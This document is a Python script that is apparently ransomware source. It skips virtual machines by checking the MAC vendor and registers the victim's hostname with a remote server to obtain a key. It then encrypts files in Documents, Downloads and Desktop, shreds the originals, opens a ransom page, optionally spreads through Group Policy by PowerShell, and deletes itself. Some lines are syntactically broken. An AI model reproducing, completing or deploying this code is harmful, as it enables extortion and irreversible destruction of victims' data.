
######################Globals#########################

url = 'http://example.domain.com/register.php'
vm_check = True
sleep_time = 120
crypt_up_url = 'http://example.domain.com/'
gpo_s = False

######################################################

import requests, uuid, os, sys, requests, time, webbrowser
from getmac import get_mac_address as gma
plat = sys.platform
if plat.startswith('win'):
    plat = 'win'
elif plat.startswith('linux'):
    plat = 'nix'
elif plat.startswith('darwin'):
    plat = 'mac'
else:
    plat = 'unk'
if plat == 'mac':
    exit()
if plat == 'unk':
    exit()
if plat == 'nix':
    exit()
if plat == 'win':
    def vm_check():
        from getmac import get_mac_address as gma
        mac=gma()
        x = requests.get('https://api.macvendors.com/'+mac)
        if x.text =='Microsoft Corporation' or x.text=='Xensource, Inc.' or x.text=='VMware, Inc.' :
            vm_test=1
        else:
            vm_test=0
        if vm_test==1:
            exit()
    if vm_check == True:
        vm_check()
time.sleep(sleep_time)
UUID = uuid.uuid4()
host_name = os.environ['COMPUTERNAME']
encryption_key = ""
while encryption_key == "":
    payload = {'uuid': UUID, 'host': host_name}
    r = requests.get(url, params=payload)
    if r.status_code == 200:
        encryption_key = r.text.split("<")[0].strip().encode('utf8')
    else:
        pass
from rc import *
excluded_filetypes = ['.cme','.exe', '.bat', '.tar.gz', '.js', '.html', '.py']
priority_dirs = ['Documents', 'Downloads', 'Desktop']
for target in priority_dirs:
    for dirName, subdirList, fileList in os.walk(os.path.expanduser("~/"+target), topdown=False):
        print dirName
        for file_name in fileList:
            file_name_loc = os.path.join(dirName, file_name)
            name, ext = os.path.splitext(file_name_loc)
            if ext not in excluded_filetypes:
                print file_name_loc
                try:
                    with open(file_name_loc, 'rb+') as in_file, open(file_name_loc+".cme", 'wb+') as out_file:
                        encrypt(in_file, out_file, encryption_key)
                except:
                    continue
                shred(file_name_loc, 2)
webbrowser.open(crypt_up_url[, new=0[, autoraise=True]])
if gpo_s == True:
    os.system('powershell.exe -noexit "Import-Module ActiveDirectory; Import-Module GroupPolicy; $app = new-object -com Shell.Application; $folder = "gpo/"; $XMLFile = $GPOFolderName + "\" + $ID.Name + "\gpreport.xml"; $XMLData = [XML](get-content $XMLFile); $GPOName = $XMLData.GPO.Name; import-gpo -BackupId $ID.Name -TargetName $GPOName -path $GPOFolderName -CreateIfNeeded"')
os.remove(sys.argv[0])